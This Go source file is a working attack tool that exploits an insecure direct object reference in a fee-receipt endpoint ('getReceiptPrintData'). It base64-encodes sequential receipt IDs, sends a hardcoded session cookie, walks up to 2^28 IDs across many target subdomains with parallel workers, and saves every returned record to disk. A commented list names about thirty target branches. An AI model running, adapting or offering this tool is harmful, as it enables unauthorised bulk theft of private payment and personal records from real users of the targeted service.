package main
// Data exfiltration through IDOR vulnerability

// Usage:
// go run nastycorp.go <url> [threads]

// Example:
// go run nastycorp.go localhost 20

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path"
	"strconv"
)

const max int = 1 << 28

var Endpoint string
var N int = 16 // Spawn N processes in parallel

type Work struct {
	Branch string
	Id     int
}

func Do(Jobs <-chan Work, Result chan<- error) {
	var DynObj map[string]interface{}
	for job := range Jobs {
		filepath := path.Join(job.Branch, fmt.Sprintf("%d.json", job.Id))
		if _, err := os.Stat(filepath); err == nil { // file already exists
			Result <- nil
			continue
		}		
		ro, err := http.NewRequest("GET", fmt.Sprintf("https://%s.%s/gw/fee/getReceiptPrintData?fl=%s", job.Branch, Endpoint, base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("id=%d", job.Id)))), nil)
		ro.AddCookie(&http.Cookie{Name:"JSESSIONID", Value:"bMDrRYwaIE8fntbN1yTZNw"})
		r, err := new(http.Client).Do(ro)
		if err != nil {
			Result <- err
			continue
		}
		defer r.Body.Close()
		b, err := ioutil.ReadAll(r.Body)
		if err != nil {
			Result <- err
			continue
		}
		if err := json.Unmarshal(b, &DynObj); err != nil {
			Result <- err
			continue
		}
		if DynObj["d"] == nil {
			Result <- errors.New(fmt.Sprintf("%s, %d: JSONObject `d` is nil", job.Branch, job.Id))
			continue
		}
		Dump, err := json.Marshal(DynObj["d"])
		if err != nil {
			Result <- err
			continue
		}
		if err := ioutil.WriteFile(filepath, Dump, 0644); err != nil {
			Result <- err
			continue
		}
		Result <- nil
	}
}

func main() {
	//branches := []string{"alcs", "asc", "ccs", "ccspp", "dpset", "dpsnt", "dpsrh", "dpsrhj", "gdgps", "gkk", "gmps", "idps", "iphs", "kpps", "mrvjp", "mrvms", "mrvps", "rkvvm", "sajp", "sapp", "sbdn", "sbfz", "sbg", "sbgh", "sps", "spsjh", "spsjr", "spskg", "spskt", "vsis"}
	branches := []string{"dpsnt"}
	Result := make(chan error)
	Jobs := make(chan Work, N)
	if len(os.Args) > 1 {
		Endpoint = os.Args[1]
		if len(os.Args) == 3 {
			n, err := strconv.Atoi(os.Args[2])
			if err != nil {
				log.Fatalln(err)
			}
			if n == 0 {
				log.Fatalln("At least 1 worker thread is needed")
			}
			N = n
		}
	} else {
		fmt.Printf("Usage:\n\n\t%s <uri> [threads]\n\nExample:\n\n\t%s localhost 20\n\n", os.Args[0], os.Args[0])
		return
	}
	for _, B := range branches {
		os.Mkdir(B, 0755)
		go func() {
			for i := 0; i < max; i++ {
				Jobs <- Work{B, i}
			}
		} ()
	}
	for i := 0; i < N; i++ {
		go Do(Jobs, Result)
	}
	for i := 0; i < max*len(branches); i++ {
		if err := <-Result; err != nil {
			log.Println(err)
		}
	}
	close(Jobs)
	close(Result)
}
